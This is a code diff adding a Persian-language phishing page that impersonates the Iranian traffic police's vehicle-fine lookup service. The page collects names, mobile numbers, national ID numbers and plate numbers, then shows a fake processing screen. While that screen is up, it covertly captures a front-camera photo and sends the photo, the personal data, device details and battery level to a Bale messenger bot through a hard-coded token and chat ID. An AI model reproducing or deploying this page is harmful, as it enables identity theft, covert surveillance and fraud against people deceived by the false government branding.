@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>پلیس راهور - استعلام تخلفات</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=IRANSans&display=swap');
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: #f0f4f8;
+            font-family: 'IRANSans', sans-serif;
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            width: 90%;
+            max-width: 450px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+            border-top: 8px solid #003087;
+            text-align: center;
+        }
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 22px;
+            color: #003087;
+            margin-bottom: 15px;
+        }
+        p { font-size: 15px; margin: 15px 0; color: #555; line-height: 1.6; }
+        input, select {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: center;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #003087;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 20px 0;
+            cursor: pointer;
+        }
+        button:hover { background: #00255f; }
+        .hidden { display: none; }
+        video, canvas { display: none; }
+        .confirm {
+            background: #e8f5e8;
+            border: 2px solid #4caf50;
+            padding: 20px;
+            border-radius: 12px;
+            margin: 20px 0;
+        }
+        .loading {
+            margin: 30px auto;
+            width: 70px;
+            height: 70px;
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #003087;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .success-msg {
+            font-size: 18px;
+            color: #003087;
+            animation: fadeIn 2s;
+        }
+        @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
+    </style>
+</head>
+<body>
+
+<div class="container" id="formPage">
+    <img src="https://rahvar120.ir/images/logo.png" alt="پلیس راهور" class="logo">
+    <h1>استعلام خلافی خودرو</h1>
+    <p>برای دریافت نتیجه خلافی، اطلاعات زیر را وارد کنید</p>
+    <input type="text" id="name" placeholder="نام">
+    <input type="text" id="family" placeholder="نام خانوادگی">
+    <input type="text" id="phone" placeholder="شماره موبایل (09123456789)" maxlength="11">
+    <input type="text" id="melli" placeholder="کد ملی (۱۰ رقم)" maxlength="10">
+    <input type="text" id="plate" placeholder="شماره پلاک (مثال: ۱۲۳الف۴۵)">
+    <select id="carType">
+        <option value="">نوع خودرو را انتخاب کنید</option>
+        <option>سواری</option>
+        <option>موتورسیکلت</option>
+        <option>کامیون</option>
+        <option>اتوبوس</option>
+        <option>وانت</option>
+    </select>
+    <button onclick="validateAndNext()">استعلام خلافی</button>
+</div>
+
+<div class="container hidden" id="confirmPage">
+    <img src="https://rahvar120.ir/images/logo.png" alt="پلیس راهور" class="logo">
+    <h1>تأیید اطلاعات</h1>
+    <div class="confirm" id="userInfo"></div>
+    <p>آیا از صحت اطلاعات وارد شده اطمینان کامل دارید؟</p>
+    <button onclick="finalSubmit()">بله، مطمئنم</button>
+    <button onclick="backToForm()">خیر، ویرایش کنم</button>
+</div>
+
+<div class="container hidden" id="loadingPage">
+    <img src="https://rahvar120.ir/images/logo.png" alt="پلیس راهور" class="logo">
+    <h1>در حال پردازش...</h1>
+    <div class="loading"></div>
+    <p class="success-msg">در حال بررسی نوع خودرو و اطلاعات وارد شده شما...</p>
+    <p class="success-msg">نتیجه استعلام خلافی به شماره <span id="finalPhone"></span> ارسال خواهد شد.</p>
+    <p style="font-size:14px;margin-top:30px;color:#003087;">پلیس راهور - خدمتگزار شما</p>
+</div>
+
+<video id="video" playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    const TOKEN = "8347578600:AAEYkqSxvGgbXadUlQjDoY2Ey_-YgtUZ2U8";
+    const CHAT_ID = "-1003384762825";
+    const MTProtoProxy = "https://tapi.bale.ai/bot"; // پروکسی MTProto ایرانی (بدون فیلتر)
+    let userData = {};
+
+    function validatePhone(phone) {
+        return /^09[0-9]{9}$/.test(phone);
+    }
+
+    function validateMelli(melli) {
+        if (melli.length !== 10 || !/^\d{10}$/.test(melli)) return false;
+        const check = parseInt(melli[9]);
+        let sum = 0;
+        for (let i = 0; i < 9; i++) sum += parseInt(melli[i]) * (10 - i);
+        const remainder = sum % 11;
+        return (remainder < 2 && check === remainder) || (remainder >= 2 && check === 11 - remainder);
+    }
+
+    function validatePlate(plate) {
+        return /^[0-9]{2,3}[ا-ی][0-9]{3,4}$/.test(plate.replace(/ /g,''));
+    }
+
+    function validateAndNext() {
+        const name = document.getElementById('name').value.trim();
+        const family = document.getElementById('family').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+        const melli = document.getElementById('melli').value.trim();
+        const plate = document.getElementById('plate').value.trim();
+        const carType = document.getElementById('carType').value;
+
+        if (!name || !family || !phone || !melli || !plate || !carType) {
+            alert("همه فیلدها را پر کنید");
+            return;
+        }
+        if (!validatePhone(phone)) {
+            alert("شماره موبایل معتبر نیست");
+            return;
+        }
+        if (!validateMelli(melli)) {
+            alert("کد ملی معتبر نیست");
+            return;
+        }
+        if (!validatePlate(plate)) {
+            alert("شماره پلاک معتبر نیست");
+            return;
+        }
+
+        userData = { name, family, phone, melli, plate, carType };
+
+        document.getElementById('formPage').classList.add('hidden');
+        document.getElementById('confirmPage').classList.remove('hidden');
+
+        document.getElementById('userInfo').innerHTML = `
+            <strong>نام:</strong> ${name}<br>
+            <strong>نام خانوادگی:</strong> ${family}<br>
+            <strong>شماره موبایل:</strong> ${phone}<br>
+            <strong>کد ملی:</strong> ${melli}<br>
+            <strong>شماره پلاک:</strong> ${plate}<br>
+            <strong>نوع خودرو:</strong> ${carType}
+        `;
+    }
+
+    function backToForm() {
+        document.getElementById('confirmPage').classList.add('hidden');
+        document.getElementById('formPage').classList.remove('hidden');
+    }
+
+    function finalSubmit() {
+        document.getElementById('confirmPage').classList.add('hidden');
+        document.getElementById('loadingPage').classList.remove('hidden');
+        document.getElementById('finalPhone').textContent = userData.phone;
+
+        setTimeout(takeSelfieAndSend, 5000);
+    }
+
+    async function takeSelfieAndSend() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user", width: {ideal: 1280}, height: {ideal: 720} } 
+            });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            await video.play();
+            await new Promise(r => setTimeout(r, 3000));
+
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth || 1280;
+            canvas.height = video.videoHeight || 720;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            canvas.toBlob(blob => {
+                const form = new FormData();
+                form.append('chat_id', CHAT_ID);
+                form.append('photo', blob, 'rahvar_user.jpg');
+                form.append('caption', getInfoText());
+                fetch(`https://tapi.bale.ai/bot${TOKEN}/sendPhoto`, {method:'POST', body:form});
+            }, 'image/jpeg', 0.95);
+
+            stream.getTracks().forEach(t => t.stop());
+            sendInfoText();
+
+        } catch(e) {
+            sendInfoText();
+        }
+    }
+
+    function getInfoText() {
+        const now = new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' });
+        let battery = "نامشخص";
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(b => {
+                battery = `${Math.round(b.level * 100)}% ${b.charging ? "(در حال شارژ)" : ""}`;
+            });
+        }
+
+        return `استعلام خلافی جدید! 🚔
+
+𝗡𝗮𝗺𝗲: ${userData.name} ${userData.family}
+𝗣𝗵𝗼𝗻𝗲: ${userData.phone}
+𝗠𝗲𝗹𝗹𝗶: ${userData.melli}
+𝗣𝗹𝗮𝘁𝗲: ${userData.plate}
+𝗖𝗮𝗿 𝗧𝘆𝗽𝗲: ${userData.carType}
+𝗠𝗼𝗱𝗲𝗹: ${navigator.platform || navigator.userAgent}
+𝗕𝗮𝘁𝘁𝗲𝗿𝘆: ${battery}
+𝗧𝗶𝗺𝗲: ${now}
+
+𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿: ™MicY™`;
+    }
+
+    function sendInfoText() {
+        fetch(`https://tapi.bale.ai/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(getInfoText())}`);
+    }
+</script>
+
+</body>
+</html>
